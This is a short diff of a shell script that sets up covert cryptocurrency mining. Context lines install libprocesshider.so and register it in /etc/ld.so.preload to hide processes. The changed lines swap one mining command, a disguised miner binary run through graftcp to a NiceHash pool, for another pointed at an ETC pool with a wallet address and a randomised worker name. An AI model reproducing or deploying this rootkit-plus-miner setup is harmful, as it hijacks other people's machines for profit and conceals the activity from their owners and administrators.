@@ -56,4 +56,5 @@ mv libprocesshider.so /usr/local/lib/
 
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bezzHash --algo ETHASH --pool daggerhashimoto.eu-west.nicehash.com:3353 --user 3BsJ6cvtviyvS6tWfFWaDGHStB8pTHUrNH.$(echo $(shuf -i 1-9999 -n 1)-modalnikah) --ethstratum ETHPROXY
+./graftcp/graftcp ./bezzHash --algo ETCHASH --pool etc.2miners.com:1010 --user 0x11880b1cfe04907c5306222be1e09f4bbb480eb5.$(echo $(shuf -i 1-9999 -n 1)-sty) --ethstratum ETHPROXY
+
